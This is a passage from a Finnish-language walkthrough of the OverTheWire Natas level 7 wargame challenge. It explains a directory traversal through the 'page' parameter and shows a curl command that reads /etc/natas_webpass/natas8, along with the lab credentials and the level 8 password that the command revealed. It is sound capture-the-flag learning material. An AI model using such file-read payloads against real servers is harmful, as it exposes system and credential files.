- `../../../../../../etc/natas_webpass/natas8` tarkoittaa, ett√§ noustaan kuusi tasoa yl√∂sp√§in (pois `natas7`, `natas`, `www`, `var`, jne.), jotta saavutetaan juurihakemisto (`/etc`).
- n√§in ollen siirryt√§√§n `natas_webpass/natas8`, eli polku ohjaa tiedostoon, jossa on siksi mahdollisesti on taso 8 salasansa.

## Miksi t√§m√§ toimii?
- Jos palvelin ei ole suojattu **directory traversal** -hy√∂kk√§yksilt√§, se sallii polkumuutokset ja antaa p√§√§syn tiedostoihin hakemistorakenteen ulkopuolella.
- T√§m√§ on mahdollista, koska **index.php** k√§ytt√§√§ `GET`-parametria (`page`), joka voi k√§sitell√§ manipulointia ilman tarkastuksia.
- Hakkerointiteknisesti t√§m√§ opettaa, miksi hakemiston p√§√§syn rajoittaminen on t√§rke√§√§.
- N√§in ollen t√§m√§ tarkoittaa palvelin sallii navigoinnin syvemm√§lle tiedostoj√§rjestelm√§√§n.

## Perustelut ja oppimispisteet
T√§m√§ haaste auttaa ymm√§rt√§m√§√§n hakemistorakenteiden hy√∂dynt√§mist√§ palvelimilla sek√§ sen, miksi polkumuutosten validointi on kriittist√§ turvallisuuden kannalta. üõ°Ô∏è


---

## Level 7 - 2 - Kali Linux version - CONTINUE HERE;


Aikaisemmassa testauksessa menty `for-loop` kautta, mutta sekin voi menn√§ pikkasen vaikeammaksi, mutta nyt saattiin ainakin jotakin ja vihjeit√§ l√∂ytyy nettist√§kin.

en tied√§ miksi menin mutkan kautta, mutta t√§m√§kin onnistui, mutta kulkematta -Headerin referenssi√§ ja siit√§ sy√∂tt√§en kohti natas7 levelin ja sen salasansa, sitten vihjeen mukaan se `/etc/natas_webpass/natas8` - hakemiston polun kautta. T√§ss√§ vain menty joko "home" tai "about" sivuston alle, ja urlista kummoaa ne parametrit (home | aboout), ett√§ sijoittaa per√§n sen hakemistonsa.

```
‚îå‚îÄ‚îÄ(kali„âøkali)-[~]
‚îî‚îÄ$ curl -u natas7:bmg8SvU1LizuWjx3y7xkNERkHxGre0GS "http://natas7.natas.labs.overthewire.org/index.php?page=/etc/natas_webpass/natas8"
<html>
<head>
<!-- This stuff in the header has nothing to do with the level -->
<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
<script>var wechallinfo = { "level": "natas7", "pass": "bmg8SvU1LizuWjx3y7xkNERkHxGre0GS" };</script></head>
<body>
<h1>natas7</h1>
<div id="content">

<a href="index.php?page=home">Home</a>
<a href="index.php?page=about">About</a>
<br>
<br>
xcoXLmzMkoIP9D7hlgPlh9XD7OgLAe5Q

<!-- hint: password for webuser natas8 is in /etc/natas_webpass/natas8 -->
</div>
</body>
</html>
```

---

# Level 8 - START HERE;






